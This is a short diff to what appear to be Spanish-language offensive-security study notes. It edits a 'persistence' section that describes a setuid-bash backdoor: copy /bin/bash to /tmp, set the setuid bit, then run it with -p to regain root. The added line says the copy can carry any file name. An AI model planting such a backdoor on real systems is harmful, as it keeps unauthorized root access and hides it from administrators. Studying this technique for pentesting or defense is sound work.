@@ -312,7 +312,7 @@ te lo llevas al burpsuite y ya hay desde el repeater vas buscando con ls, etc
 ### PERSISTENCE 
 ```
 Ejecutandolo como root, por ejemplo hackeas un sistema muy dificil y para no tener que hacerlo de nuevo haces como una backdoor que cuando ejecutes con -p /tmp/bash te vuelve a dar root ( puedes llamarlo /tmp/ejerciciosmañaneros)
-1) cp /bin/bash /tmp/bash; chmod +s /tmp/bash  ---> copia el programa de bash en /tmp/bash y le da privilegios
+1) cp /bin/bash /tmp/bash; chmod +s /tmp/bash  ---> copia el programa de bash en /tmp/bash y le da privilegios, el /tmp/bash puede ser el bash o cualquier otro archivo/nombre
 2) /tmp/bash -p   ----> aplica esos permisos y te da root
 ```
 ### IMPACKET
